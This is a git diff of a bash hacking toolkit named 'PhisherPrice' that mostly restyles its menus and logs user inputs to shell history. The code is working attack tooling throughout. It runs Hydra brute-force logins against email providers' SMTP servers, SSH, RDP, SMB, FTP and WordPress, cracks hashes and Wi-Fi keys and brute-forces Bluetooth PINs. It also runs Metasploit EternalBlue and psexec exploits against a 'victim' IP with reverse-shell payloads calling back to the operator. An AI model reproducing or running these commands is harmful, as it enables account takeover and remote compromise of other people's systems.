-(3) John-The-Ripper
-(4) Archive Password Cracker
-(5) Hash-Identifier
-(6) Hashcat
-(7) Aircrack-ng (Crack Wifi Pass)
-(8) Start sqldict
-(9) Wifi Honey Pot Cracker
-(10) Just Dump It
-
-Press q/Q To Exit
-Press b/B To Go To Back
-'
-echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"Cracking/Brute$Blue]:"
-read -r -p" └─────► " choice
+	
+echo -e "
+┌────────────────────────────────────────────┐
+│${red}Cracking / Brute Force${reset}                      │
+├────────────────────────────────────────────┤
+│${green}1${reset}  │Bluetooth Toolkit                       │
+│${green}2${reset}  │Auto-Brute (Hydra)                      │
+│${green}3${reset}  │John-The-Ripper                         │
+│${green}4${reset}  │Archive Password Cracker                │
+│${green}5${reset}  │Hash-Identifier                         │
+│${green}6${reset}  │Hashcat                                 │
+│${green}7${reset}  │Aircrack-ng (Crack Wifi Pass)           │
+│${green}8${reset}  │Start sqldict                           │
+│${green}9${reset}  │Wifi Honey Pot Cracker                  │
+│${green}10${reset} │Just Dump It                            │
+├────────────────────────────────────────────┤
+│    b/B To Go To Back ~ q/Q To Exit         │
+"├$blue["$red"PhisherPrice$blue]$reset──$blue[$red~$blue]$reset──$blue["$yellow"Cracking/Brute$blue]:"$reset──────┘"
+read -r -p"└─────► $reset" choice
 
     case $choice in
       1)
@@ -1075,9 +1160,9 @@ read -r -p" └─────► " choice
 echo -e "\nPassword Cracking Script Using John the Ripper"
 echo -e "-------------------------------------------\n"
 echo "Enter the path to your wordlist (e.g. /usr/share/john/password.lst): " 
-read -e wordlist
+read -e wordlist && echo "$wordlist" >> ~/.bash_history 2>/dev/null
 echo "Enter the path to the file to crack (e.g. /usr/john/Documents/unshadowed.txt): " 
-read -e file
+read -e file && echo "$file" >> ~/.bash_history 2>/dev/null
 
 if ! [ -f "$wordlist" ]; then
     clear
@@ -1106,6 +1191,7 @@ echo -e "-------------------------------------------\n"
 
         ;;
       4)
+      clear
 echo "Enter the path to the archive file:"
 read -e archive
 
@@ -1140,54 +1226,33 @@ read -p "Press Enter to continue."
 fi
         ;;
       5)
-        clear
-if ! command -v hash-identifier &> /dev/null
-then
-    echo "hash-identifier is not installed. Would you like to install it? (y/n)"
-    read choice
-    if [ "$choice" == "y" ]; then
-        sudo apt-get install hash-identifier
-    else
-        return
-    fi
-fi
-
-# Run hash-identifier
 clear
 echo -e "\nHash Identifier"
 echo -e "-------------------------------------------\n"
-echo -e '
+echo -e "
 -------------------------------------------
-|           CTRL + C TO QUIT              |
+|           ${yellow}CTRL + C TO QUIT${reset}              |
 -------------------------------------------
- '
+ "
 hash-identifier
-echo -e '
+echo -e "
 -------------------------------------------
-|               Good Bye                  |
+|               ${green}Good Bye${reset}                  |
 -------------------------------------------
-'
+"
         ;;
       6)
         clear
-echo -e '\e[1;33m
-  ___ ___               .__                   __   
- /   |   \_____    _____|  |__   ____ _____ _/  |_ 
-/    ~    \__  \  /  ___/  |  \_/ ___\\__  \\   __\
-\    Y    // __ \_\___ \|   Y  \  \___ / __ \|  |  
- \___|_  /(____  /____  >___|  /\___  >____  /__|  
-       \/      \/     \/     \/     \/     \/      \e[1;34m
-'
-echo -e "\nHashcat Password Cracking Script"
+echo -e "\n${yellow}Hashcat Password Cracking Script${reset}"
 echo -e "-------------------------------------------\n"
 
 # Prompt user for input
 echo "Enter Hash Type (500 = md5crypt): " 
-read -e encmode
-echo "Enter Hash Location (e.g. /usr/share/me/example500.hash): " 
-read -e hashtype
+read -e encmode 
+echo "Enter Hash Location (${cyan}e.g. ${yellow}/usr/share/me/example500.hash):${reset} " 
+read -e hashtype && echo "$hashtype" >> ~/.bash_history 2>/dev/null
 echo "Enter Wordlist Location (e.g. /usr/share/wordlists/sqlmap.txt): " 
-read -e wordlist
+read -e wordlist && echo "$wordlist" >> ~/.bash_history 2>/dev/null
 
 # Check if the specified files exist
 if ! [[ -f $hashtype ]]; then
@@ -1196,7 +1261,7 @@ if ! [[ -f $hashtype ]]; then
 fi
 
 if ! [[ -f $wordlist ]]; then
-  echo "Error: Wordlist file not found."
+  echo "${red}Error:${reset} Wordlist file not found."
   read -p "Press Enter to continue." 
 fi
 
@@ -1209,24 +1274,16 @@ hashcat -m $encmode $hashtype $wordlist
 
 if [[ $? -eq 0 ]]; then
   echo -e "\n-------------------------------------------"
-  echo "Password successfully cracked!"
+  echo "Password ${green}successfully${reset} cracked!"
   echo -e "-------------------------------------------\n"
 else
   echo -e "\n-------------------------------------------"
-  echo "Password not found in the wordlist."
+  echo "Password ${red}not found${reset} in the wordlist."
   echo -e "-------------------------------------------\n"
 fi
         ;;
       7)
         clear
-echo -e '\e[1;33m
-   _____  .__                                    __                             
-  /  _  \ |__|______   ________________    ____ |  | __           ____    ____  
- /  /_\  \|  \_  __ \_/ ___\_  __ \__  \ _/ ___\|  |/ /  ______  /    \  / ___\ 
-/    |    \  ||  | \/\  \___|  | \// __ \\  \___|    <  /_____/ |   |  \/ /_/  >
-\____|__  /__||__|    \___  >__|  (____  /\___  >__|_ \         |___|  /\___  / 
-        \/                \/           \/     \/     \/              \//_____/  \e[1;34m
-'
 echo -e "\nAircrack-ng WPA Password Cracking Script"
 echo -e "-------------------------------------------\n"
 
@@ -1274,6 +1331,7 @@ sqldict
 
         ;;
       9)
+      clear
 echo -n "Enter wireless interface (e.g. wlan1 or wlan0): "
 read -e iface
 
@@ -1284,7 +1342,7 @@ ip link set dev $iface up
 airmon-ng start $iface
 
 echo -n "Enter target ESSID: "
-read -e essid
+read -e essid && echo "$essid" >> ~/.bash_history 2>/dev/null
 echo -n "Enter target channel: "
 read -e ch
 
@@ -1311,7 +1369,8 @@ kill $pid1 $pid2 $pid3 $pid4 $pid5
 airmon-ng stop mon0
         ;;
       10)
-        # A modified version of Gary Hooks' work sys_info.sh:
+      clear
+# A modified version of Gary Hooks' work sys_info.sh:
 # 	Original Author: Gary Hooks
 # 	Web: http://www.twintel.co.uk
 # Supporting input from:
@@ -1547,7 +1606,7 @@ printf "Results will be stored here: \t $FINAL_PATH \n\n"
         ;;
         q|Q)
         clear
-        echo "Exiting PhisherPrice. Goodbye!"
+        echo "${red}Exiting PhisherPrice.${green} Goodbye!${reset}"
         exit 0
         ;;
       *)
@@ -1563,28 +1622,25 @@ autohydrasub() {
   while true
   do
 clear
-echo -e "${banner}"
-echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"                       
-                   
-\e[0m\e[3;39m \e[1;31m
-Hydra Brute Force
-\e[3;39m
-(1) Email Crack (SMTP)
-(2) SNMP Brute Force
-(3) FTP Brute Force
-(4) SSH  Brute Force
-(5) SSH  Brute Force (port 22)
-(6) POP3 Brute Force
-(7) HTTP 401 Brute Force
-(8) Windows RDP Brute Force
-(9) SMB Brute Force
-(10) WP AUTO BRUTE
 
-Press q/Q To Exit
-Press b/B To Go To Back
-'
-echo -e $Blue" ┌─["$red"PhisherPrice$BlueF]──[$red~$Blue]─["$yellow"Hydra$Blue]:"
-read -r -p" └─────► " choice
+echo -e "
+┌────────────────────────────────────────────┐
+│${red}Hydra Brute Force${reset}                           │
+├────────────────────────────────────────────┤
+│${green}1${reset}  │Email Crack (SMTP)                      │
+│${green}2${reset}  │SNMP Brute Force                        │
+│${green}3${reset}  │FTP Brute Force                         │
+│${green}4${reset}  │SSH  Brute Force                        │
+│${green}5${reset}  │SSH  Brute Force (port 22)              │
+│${green}6${reset}  │POP3 Brute Force                        │
+│${green}7${reset}  │HTTP 401 Brute Force                    │
+│${green}8${reset}  │Windows RDP Brute Force                 │
+│${green}9${reset}  │SMB Brute Force                         │
+│${green}10${reset} │WP AUTO BRUTE                           │
+├────────────────────────────────────────────┤
+│    b/B To Go To Back ~ q/Q To Exit         │
+"├$blue["$red"PhisherPrice$blue]$reset──$blue[$red~$blue]$reset──$blue["$yellow"Hydra$blue]:"$reset───────────────┘"
+read -r -p"└─────► $reset" choice
     case $choice in
       e|E)
         clear
@@ -1609,15 +1665,6 @@ declare -A imap_options=(
   ["hotmail"]="outlook.office365.com:993"
 )
 
-# Display banner
-echo -e '\e[1;33m
-   _____                       __    
-  / ___ \____________    ____ |  | __
- / / ._\ \_  __ \__  \ _/ ___\|  |/ /
-<  \_____/|  | \// __ \\  \___|    < 
- \_____\  |__|  (____  /\___  >__|_ \
-                     \/     \/     \/\e[1;34m
-'
 echo -e "\e[1;33mSimple Email Cracking Script.\e[0m"
 echo -e "\n-------------------------------------------"
 
@@ -1663,9 +1710,9 @@ esac
 
 # Get email address and password file path
 echo -n "Enter email address: "
-read -e email
+read -e email && echo "$email" >> ~/.bash_history 2>/dev/null
 echo -n "Enter password file path: "
-read -e password_file
+read -e password_file && echo "$password_file" >> ~/.bash_history 2>/dev/null
 
 # Select protocol and port
 echo -n "Enter protocol (smtp/pop3/imap): "
@@ -1713,71 +1760,55 @@ read
         ;;
       1)
         clear
-echo -e '\e[1;33m
-   _____                       __    
-  / ___ \____________    ____ |  | __
- / / ._\ \_  __ \__  \ _/ ___\|  |/ /
-<  \_____/|  | \// __ \\  \___|    < 
- \_____\  |__|  (____  /\___  >__|_ \
-                     \/     \/     \/\e[1;34m
-'
-echo -e "\e[1;33mSimple Email Cracking Script Using Hydra.\e[0m"
+echo -e "${yellow}Simple Email Cracking Script Using Hydra.${reset}"
 echo -e "\n-------------------------------------------"
 
 echo -n "Choose a SMTP service (Gmail = smtp.gmail.com / Yahoo = smtp.mail.yahoo.com / Hotmail = smtp.live.com): "
-read -e smtp
+read -e smtp && echo "$smtp" >> ~/.bash_history 2>/dev/null
 
 echo -n "Enter Email Address: "
-read -e email
+read -e email && echo "$email" >> ~/.bash_history 2>/dev/null
 
 echo -n "Provide Directory of Wordlist for Passwords: "
-read -e wordlist
+read -e wordlist && echo "$wordlist" >> ~/.bash_history 2>/dev/null
 
 echo -n "Enter SMTP Port Number (default is 465): "
 read -e port
 port=${port:-465}  # set default port number if no input is provided
 
 echo -e "\n-------------------------------------------"
-echo -e "\e[1;34mCracking email password...\e[0m"
+echo -e "${green}Cracking email password...${reset}\e[0m"
 echo -e "-------------------------------------------"
 output=$(hydra -S -l "$email" -P "$wordlist" -e ns -V -s "$port" "$smtp" smtp 2>&1)
 
 if [[ $? -ne 0 ]]; then
-  echo -e "\e[1;31mAn error occurred while running Hydra. Please check your input and try again.\e[0m"
+  echo -e "${red}An error occurred while running Hydra. Please check your input and try again.${reset}"
   return
 fi
 
 echo -e "\n-------------------------------------------"
-echo -e "\e[1;32mHydra output:\e[0m"
+echo -e "${green}Hydra output:${reset}"
 echo -e "-------------------------------------------"
 echo -e "$output"
 
         ;;
       2)
         clear
-echo -e '\e[1;33m
-  _________ _______      _____ __________ 
- /   _____/ \      \    /     \\______   \
- \_____  \  /   |   \  /  \ /  \|     ___/
- /        \/    |    \/    Y    \    |    
-/_______  /\____|__  /\____|__  /____|    
-        \/         \/         \/ Brute Force \e[1;34m
-'
 echo "Simple SNMP Password Cracking Script Using Hydra"
 echo -e "\n-------------------------------------------"
 echo "Enter the path of the password list:"
-read -e hydrasnmppass
+read -e hydrasnmppass && echo "$hydrasnmppass" >> ~/.bash_history 2>/dev/null
 echo "Enter The Host IP Address of SNMP Server:"
-read -e hydraip
+read -e hydraip && echo "$hydraip" >> ~/.bash_history 2>/dev/null
 
 echo -e "\n-----------------------------"
-echo "Attempting SNMP password cracking..."
+echo "${yellow}Attempting SNMP password cracking...${reset}"
 echo "-----------------------------"
 output=$(hydra -P $hydrasnmppass -v $hydraip snmp 2>&1)
 
 if echo "$output" | grep -q "login:\|password:"; then
   echo -e "\n-------------------------------------------"
-  echo "SNMP password cracked successfully!"
+  echo "SNMP password cracked ${green}successfully!${reset}"
   echo -e "-------------------------------------------"
   echo "Cracked password:"
   echo "$output"
@@ -1791,56 +1822,40 @@ fi
         ;;
       3)
        clear
-echo -e '\e[1;33m
-________________________________ 
-\_   _____/\__    ___/\______   \
- |    __)    |    |    |     ___/
- |     \     |    |    |    |    
- \___  /     |____|    |____|    
-     \/ Brute Force\e[1;34m
-'
 echo "FTP Password Cracking Script Using Hydra"
 echo -e "\n-------------------------------------------"
 echo "Enter Known User:"
-read -e hydrauser
+read -e hydrauser && echo "$hydrauser" >> ~/.bash_history 2>/dev/null
 echo "Enter Password List Location:"
-read -e hydrapasslist
+read -e hydrapasslist && echo "$hydrapasslist" >> ~/.bash_history 2>/dev/null
 echo "Enter the IP Address:"
-read -e hydraip
+read -e hydraip && echo "$hydraip" >> ~/.bash_history 2>/dev/null
 
 echo -e "\n-------------------------------------------"
-echo "Running hydra..."
+echo "${yellow}Running hydra...${reset}"
 output=$(hydra -t 1 -l $hydrauser -P $hydrapasslist -vV $hydraip ftp 2>&1)
 
 if echo "$output" | grep -q "1 valid password found"; then
   echo -e "\n-------------------------------------------"
-  echo "Login Successful!"
+  echo "${green}Login Successful!${reset}"
   echo -e "-------------------------------------------"
 else
   echo -e "\n-------------------------------------------"
-  echo "Login Failed"
+  echo "${red}Login Failed${reset}"
   echo -e "-------------------------------------------"
 fi
 
         ;;
       4)
        clear
-echo -e '\e[1;33m
-  _________ _________ ___ ___  
- /   _____//   _____//   |   \ 
- \_____  \ \_____  \/    ~    \
- /        \/        \    Y    /
-/_______  /_______  /\___|_  / 
-        \/        \/       \/ Brute Force \e[1;34m
-'
 echo "SSH Password Cracking Script Using Hydra"
 echo -e "\n-------------------------------------------"
 echo "Enter User List Location:"
-read -e hydrauser2
+read -e hydrauser2 && echo "$hydrauser2" >> ~/.bash_history 2>/dev/null
 echo "Enter Password List Location:"
-read -e hydrapasslist2
+read -e hydrapasslist2 && echo "$hydrapasslist2" >> ~/.bash_history 2>/dev/null
 echo "Enter IP Address:"
-read -e hydraip2
+read -e hydraip2 && echo "$hydraip2" >> ~/.bash_history 2>/dev/null
 
 echo -e "\n-------------------------------------------"
 echo "Running hydra..."
@@ -1849,12 +1864,12 @@ output=$(hydra -v -V -u -L $hydrauser2 -P $hydrapasslist2 -t 1 -u $hydraip2 ssh 
 if echo "$output" | grep -q "1 valid password found"; then
   password=$(echo "$output" | grep "login:" | awk '{print $NF}')
   echo -e "\n-------------------------------------------"
-  echo "Login Successful!"
-  echo "Password: $password"
+  echo "${green}Login Successful!${reset}"
+  echo "${cyan}Password:${yellow}$password${reset}"
   echo -e "-------------------------------------------"
 else
   echo -e "\n-------------------------------------------"
-  echo "Login Failed"
+  echo "${red}Login Failed${reset}"
   echo -e "-------------------------------------------"
 fi
         ;;
@@ -1863,11 +1878,11 @@ fi
 echo -e "\nFTP Password Cracking Script Using Hydra"
 echo -e "\n-------------------------------------------"
 echo "Enter Known User:"
-read -e hydrauser
+read -e hydrauser && echo "$hydrauser" >> ~/.bash_history 2>/dev/null
 echo "Enter Password List Location:"
-read -e hydrapasslist
+read -e hydrapasslist && echo "$hydrapasslist" >> ~/.bash_history 2>/dev/null
 echo "Enter the IP Address:"
-read -e hydraip
+read -e hydraip && echo "$hydraip" >> ~/.bash_history 2>/dev/null
 
 echo -e "\n-------------------------------------------"
 echo "Running hydra..."
@@ -1875,11 +1890,11 @@ output=$(hydra -t 1 -l $hydrauser -P $hydrapasslist -vV $hydraip ftp 2>&1)
 
 if echo "$output" | grep -q "1 valid password found"; then
   echo -e "\n-------------------------------------------"
-  echo "Login Successful!"
+  echo "${green}Login Successful!${reset}"
   echo -e "-------------------------------------------"
 else
   echo -e "\n-------------------------------------------"
-  echo "Login Failed"
+  echo "${red}Login Failed${reset}"
   echo -e "-------------------------------------------"
 fi
         ;;
@@ -1887,17 +1902,17 @@ fi
         clear
 echo "Hydra WP Auto Brute"
 echo "Enter target URL (e.g. target.com):"
-read -e url
+read -e url && echo "$url" >> ~/.bash_history 2>/dev/null
 echo "Enter path to login page (e.g. /wp-login.php):"
-read -e path
+read -e path && echo "$path" >> ~/.bash_history 2>/dev/null
 echo "Enter username or path to wordlist:"
-read -e user
+read -e user && echo "$user" >> ~/.bash_history 2>/dev/null
 echo "Enter password or path to wordlist:"
-read -e pass
+read -e pass && echo "$pass" >> ~/.bash_history 2>/dev/null
 echo "Enter a string that appears on a failed login page:"
-read -e bad
+read -e bad && echo "$bad" >> ~/.bash_history 2>/dev/null
 echo "Enter POST parameter string (e.g. 'log=^USER^&pwd=^PASS^'):"
-read -e parameter
+read -e parameter && echo "$parameter" >> ~/.bash_history 2>/dev/null
 
 clear
 echo -e "\n-------------------------------------------"
@@ -1915,33 +1930,25 @@ output=$(hydra -I $url http-post-form $path:$parameter:$bad -l $user -P $pass 2>
 
 if echo "$output" | grep -q "1 valid password found"; then
   echo -e "\n-------------------------------------------"
-  echo "Login Successful!"
+  echo "${green}Login Successful!${reset}"
   echo -e "-------------------------------------------"
 else
   clear
   echo -e "\n-------------------------------------------"
-  echo "Login Failed"
+  echo "${red}Login Failed${reset}"
   echo -e "-------------------------------------------"
 fi
         ;;
       7)
         clear
-echo -e '\e[1;33m
-                    ________  
-______   ____ ______\_____  \ 
-\____ \ /  _ \\____ \ _(__  < 
-|  |_> >  <_> )  |_> >       \
-|   __/ \____/|   __/______  /
-|__|          |__|         \/ Brute Force \e[1;34m
-'
 echo "POP3 Password Cracking Script Using Hydra"
 echo -e "\n-------------------------------------------"
 echo "Enter Known User or User List:"
-read -e hydrauser
+read -e hydrauser && echo "$hydrauser" >> ~/.bash_history 2>/dev/null
 echo "Enter Password List Location:"
-read -e hydrapasslist
+read -e hydrapasslist && echo "$hydrapasslist" >> ~/.bash_history 2>/dev/null
 echo "Enter IP Address:"
-read -e hydraip
+read -e hydraip && echo "$hydraip" >> ~/.bash_history 2>/dev/null
 
 echo -e "\n-------------------------------------------"
 echo "Running hydra..."
@@ -1949,36 +1956,28 @@ output=$(hydra -l $hydrauser -P $hydrapasslist -f $hydraip pop3 -V 2>&1)
 
 if echo "$output" | grep -q "1 valid password found"; then
   echo -e "\n-------------------------------------------"
-  echo "Login Successful!"
+  echo "${green}Login Successful!${reset}"
   echo "Password found: $(echo "$output" | grep -oP '(?<=password: )\S+')"
   echo -e "-------------------------------------------"
 else
   clear
   echo -e "\n-------------------------------------------"
-  echo "Login Failed"
+  echo "${red}Login Failed${reset}"
   echo -e "-------------------------------------------"
 fi
         ;;
       8)
         clear
-echo -e '\e[1;33m
-   _____  _______  ____ 
-  /  |  | \   _  \/_   |
- /   |  |_/  /_\  \|   |
-/    ^   /\  \_/   \   |
-\____   |  \_____  /___|
-     |__|        \/ Brute Force \e[1;34m
-'
 echo "HTTP Basic Authentication Password Cracking Script Using Hydra"
 echo -e "\n-------------------------------------------"
 echo "Enter User List Location:"
-read -e hydrauser
+read -e hydrauser && echo "$hydrauser" >> ~/.bash_history 2>/dev/null
 echo "Enter Password List Location:"
-read -e hydrapasslist
+read -e hydrapasslist && echo "$hydrapasslist" >> ~/.bash_history 2>/dev/null
 echo "Enter IP Address:"
-read -e hydraip
+read -e hydraip && echo "$hydraip" >> ~/.bash_history 2>/dev/null
 echo "Enter the 401 Login Realm"
-read -e hyhost
+read -e hyhost && echo "$hyhost" >> ~/.bash_history 2>/dev/null
 
 echo -e "\n-------------------------------------------"
 echo "Running Hydra..."
@@ -1986,36 +1985,28 @@ output=$(hydra -L $hydrauser -P $hydrapasslist $hydraip http-get /$hyhost 2>&1)
 
 if echo "$output" | grep -q "1 valid password found"; then
   echo -e "\n-------------------------------------------"
-  echo "Login Successful!"
+  echo "${green}Login Successful!${reset}"
   echo -e "-------------------------------------------"
-  echo "Password: $(echo "$output" | grep -oP '(?<=login:\s).*$')"
+  echo "${cyan}Password:${reset} $(echo "$output" | grep -oP '(?<=login:\s).*$')"
   echo -e "-------------------------------------------"
 else
   echo -e "\n-------------------------------------------"
-  echo "Login Failed"
+  echo "${red}Login Failed${reset}"
   echo -e "-------------------------------------------"
 fi
         ;;
       9)
         clear
-echo -e '\e[1;33m
-__________________ __________ 
-\______   \______ \\______   \
- |       _/|    |  \|     ___/
- |    |   \|    `   \    |    
- |____|_  /_______  /____|    
-        \/        \/ Brute Force \e[1;34m
-'
 echo "RDP Password Cracking Script Using Hydra"
 echo -e "\n-------------------------------------------"
 echo "Enter the username or username list file path:"
-read -e hydrauser8
+read -e hydrauser8 && echo "$hydrauser8" >> ~/.bash_history 2>/dev/null
 
 echo "Enter the password list file path:"
-read -e hydrapasslist8
+read -e hydrapasslist8 && echo "$hydrapasslist8" >> ~/.bash_history 2>/dev/null
 
 echo "Enter the target IP address:"
-read -e hydraip8
+read -e hydraip8 && echo "$hydraip8" >> ~/.bash_history 2>/dev/null
 
 if [ -f "$hydrauser8" ]; then
   hydrauser8="-M $hydrauser8"
@@ -2028,34 +2019,26 @@ output=$(hydra -t 1 -V -f -l $hydrauser8 -P $hydrapasslist8 rdp://$hydraip8 2>&1
 if echo "$output" | grep -q "1 valid password found"; then
   password=$(echo "$output" | grep -o "Password:.*" | cut -d' ' -f2-)
   echo -e "\n-------------------------------------------"
-  echo "Login Successful!"
+  echo "${green}Login Successful!${reset}"
   echo "Password: $password"
   echo -e "-------------------------------------------"
 else
   clear
   echo -e "\n-------------------------------------------"
-  echo "Login Failed"
+  echo "${red}Login Failed${reset}"
   echo -e "-------------------------------------------"
 fi
         ;;
       10)
         clear
-echo -e '\e[1;33m
-  _________   _____ __________ 
- /   _____/  /     \\______   \
- \_____  \  /  \ /  \|    |  _/
- /        \/    Y    \    |   \
-/_______  /\____|__  /______  /
-        \/         \/       \/ Brute Force \e[1;34m
-'
 echo "SMB Password Cracking Script Using Hydra"
 echo -e "\n-------------------------------------------"
 echo "Enter Known User or User List:"
-read -e hydrauser
+read -e hydrauser && echo "$hydrauser" >> ~/.bash_history 2>/dev/null
 echo "Enter Password List Location:"
-read -e hydrapasslist
+read -e hydrapasslist && echo "$hydrapasslist" >> ~/.bash_history 2>/dev/null
 echo "Enter the IP Address:"
-read -e hydraip
+read -e hydraip && echo "$hydraip" >> ~/.bash_history 2>/dev/null
 
 echo -e "\n-------------------------------------------"
 echo "Running hydra..."
@@ -2063,11 +2046,11 @@ output=$(hydra -t 1 -V -f -l $hydrauser -P $hydrapasslist $hydraip smb 2>&1)
 
 if echo "$output" | grep -q "1 valid password found"; then
   echo -e "\n-------------------------------------------"
-  echo "Login Successful!"
+  echo "${green}Login Successful!${reset}"
   echo -e "-------------------------------------------"
 else
   echo -e "\n-------------------------------------------"
-  echo "Login Failed"
+  echo "${red}Login Failed${reset}"
   echo -e "-------------------------------------------"
 fi
         ;;
@@ -2076,7 +2059,7 @@ fi
         ;;
         q|Q)
         clear
-        echo "Exiting PhisherPrice. Goodbye!"
+        echo "${red}Exiting PhisherPrice.${green} Goodbye!${reset}"
         exit 0
         ;;
       *)
@@ -2088,40 +2071,36 @@ fi
   done
 }
 
-# Bluetooth toolkit menu
+# bluetooth toolkit menu
 btoolkit() {
   while true
   do
   clear
-	echo -e "${banner}"
-	echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"                       
-                   
-\e[0m\e[3;39m \e[1;31m
-Bluetooth Toolkit
-\e[3;39m
-(1) Bluetooth device scanner
-(2) Bluetooth PIN Code Cracker
-
-Press q/Q To Exit
-Press b/B To Go To Back
-'
-echo -e $Blue" ┌─["$red"PhisherPrice$BlueF]──[$red~$Blue]─["$yellow"Bluetooth-Toolkit$Blue]:"
-read -r -p" └─────► " choice
-
+	
+	echo -e "
+┌────────────────────────────────────────────┐
+│${red}Bluetooth Toolkit${reset}                           │
+├────────────────────────────────────────────┤
+│${green}1${reset} │Bluetooth device scanner                 │
+│${green}2${reset} │Bluetooth PIN Code Cracker               │
+├────────────────────────────────────────────┤
+│    b/B To Go To Back ~ q/Q To Exit         │
+"├$blue["$red"PhisherPrice$blue]$reset──$blue[$red~$blue]$reset──$blue["$yellow"Bluetooth-Toolkit$blue]:"$reset───┘"
+read -r -p"└─────► $reset" choice
     case $choice in
       1)
         clear
-echo -e "\e[1;33mBluetooth PIN Code Cracking Script.\e[0m"
+echo -e "\e[1;33mbluetooth PIN Code Cracking Script.\e[0m"
 echo -e "\n-------------------------------------------"
 
 echo -n "Enter the MAC address of the target device: "
-read -e mac_address
+read -e mac_address && echo "$mac_address" >> ~/.bash_history 2>/dev/null
 echo -n "Enter the name of the PIN code file: "
-read -e pin_file
+read -e pin_file && echo "$pin_file" >> ~/.bash_history 2>/dev/null
 
 clear
 echo -e "\n-------------------------------------------"
-echo -e "\e[1;34mCracking Bluetooth PIN code...\e[0m"
+echo -e "\e[1;34mCracking bluetooth PIN code...\e[0m"
 echo -e "-------------------------------------------\n"
 
 while read pin; do
@@ -2183,7 +2162,7 @@ echo -e "\nSuccessfully connected to $mac_address."
         ;;
         q|Q)
         clear
-        echo "Exiting PhisherPrice. Goodbye!"
+        echo "${red}Exiting PhisherPrice.${green} Goodbye!${reset}"
         exit 0
         ;;
       *)
@@ -2222,175 +2201,172 @@ for interface in $interfaces; do
     fi
 done
 clear
-	echo -e "${banner}"
-	echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"                      
-                   
-\e[0m\e[3;39m \e[1;31m
-Auto Xsploit
-\e[3;39m
-(1) Scanners
-(2) Windows 7/2008 x64 ONLY by IP         (ms17_010_eternalblue)
-(3) Enable Remote Desktop                 (ms17_010_eternalblue)
-(4) Enable Remote Desktop                 (ms17_010_psexec)
-(5) Windows Vista/XP/2000/2003 ONLY by IP (ms17_010_psexec)
-(6) Windows with a link                   (HTA Server)
-(7) Windows     --> pwnd.exe (Payload & listener)
-(8) Windows     --> pwnd.exe (TCP Payload with shikata_ga_nai encoder)
-(9) Windows     --> pwnd.asp (Payload & listener)
-(10) Linux      --> pwnd.py  (Payload & listener)
-(11) MacOS      --> pwnd.jar (Payload & listener)
-(12) MacOS TCP  --> pwnd.macho (Payload & listener)
-(13) Javascript --> pwnd.jsp (Payload & listener)
-(14) Web        --> pwnd.php (Payload & listener)
-(15) MacOS      --> bind.macho (Bind Shell)
-(16) Backdoor .exe
-(17) Bind .exe With Payload & Encode (using shikata_ga_nai)
-(18) Android    --> pwnd.apk (payload & listener) 
-
-Press q/Q To Exit
-Press b/B To Go To Back
-'
-echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"Auto Xsploit$Blue]:"
-read -r -p" └─────► " choice
+	
+echo -e "
+┌──────────────────────────────────────────────────────────────────────────┐
+│${red}Auto Xsploit${reset}                                                              │
+├──────────────────────────────────────────────────────────────────────────┤
+│${green}1${reset}  │Scanners                                                              │
+│${green}2${reset}  │Windows 7/2008 x64 ONLY by IP         (ms17_010_eternalblue)          │
+│${green}3${reset}  │Enable Remote Desktop                 (ms17_010_eternalblue)          │
+│${green}4${reset}  │Enable Remote Desktop                 (ms17_010_psexec)               │
+│${green}5${reset}  │Windows Vista/XP/2000/2003 ONLY by IP (ms17_010_psexec)               │
+│${green}6${reset}  │Windows with a link                   (HTA Server)                    │
+│${green}7${reset}  │Windows     --> pwnd.exe (Payload & listener)                         │
+│${green}8${reset}  │Windows     --> pwnd.exe (TCP Payload with shikata_ga_nai encoder)    │
+│${green}9${reset}  │Windows     --> pwnd.asp (Payload & listener)                         │
+│${green}10${reset} │Linux       --> pwnd.py  (Payload & listener)                         │
+│${green}11${reset} │MacOS       --> pwnd.jar (Payload & listener)                         │
+│${green}12${reset} │MacOS TCP   --> pwnd.macho (Payload & listener)                       │
+│${green}13${reset} │Javascript  --> pwnd.jsp (Payload & listener)                         │
+│${green}14${reset} │Web         --> pwnd.php (Payload & listener)                         │
+│${green}15${reset} │MacOS       --> bind.macho (Bind Shell)                               │
+│${green}16${reset} │Backdoor .exe                                                         │
+│${green}17${reset} │Bind .exe With Payload & Encode (using shikata_ga_nai)                │
+│${green}18${reset} │Android     --> pwnd.apk (payload & listener)                         │
+├──────────────────────────────────────────────────────────────────────────┤
+│    b/B To Go To Back ~ q/Q To Exit                                       │
+"├$blue["$red"PhisherPrice$blue]$reset──$blue[$red~$blue]$reset──$blue["$yellow"Auto Xsploit$blue]:"$reset──────────────────────────────────────┘"
+read -r -p"└─────► $reset" choice
     case $choice in
       1)
         scannersmenu
         ;;
       2)
       clear
-        echo "Victim's IP:"
-read -e r
+        echo "${yellow}Victim's IP:${reset}"
+read -e r && echo "$r" >> ~/.bash_history 2>/dev/null
 
 msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/meterpreter/reverse_tcp;  set lhost $ip ; set rhost $r ; exploit ; "
         ;;
       3)
       clear
-        echo "Victim's IP:"
-read -e r
+        echo "${yellow}Victim's IP:${reset}"
+read -e r && echo "$r" >> ~/.bash_history 2>/dev/null
 
 msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/vncinject/reverse_tcp;  set lhost $ip ; set rhost $r ; set viewonly false ; exploit ; "
         ;;
       4)
       clear
-echo "Victim's IP:"
-read -e r
+echo "${yellow}Victim's IP:${reset}"
+read -e r && echo "$r" >> ~/.bash_history 2>/dev/null
 
 msfconsole -q -x " use exploit/windows/smb/ms17_010_psexec; set payload windows/vncinject/reverse_tcp;  set lhost $ip ; set rhost $r ; set viewonly false ; exploit ; "
         ;;
       5)
       clear
-       echo "Victim's IP:" 
-read -e r
+       echo "${yellow}Victim's IP:${reset}" 
+read -e r && echo "$r" >> ~/.bash_history 2>/dev/null
 
 msfconsole -q -x " use exploit/windows/smb/ms17_010_psexec; set lhost $ip ; set rhost $r ; exploit ;"
         ;;
       6)
       clear
         echo 'Uripath: (/)'
-read -e u
+read -e u && echo "$u" >> ~/.bash_history 2>/dev/null
 msfconsole -q -x " use exploit/windows/misc/hta_server; set srvhost $ip; set uripath /$u; set payload windows/meterpreter/reverse_tcp; set lhost $ip ; exploit ;"
         ;;
       7)
       clear
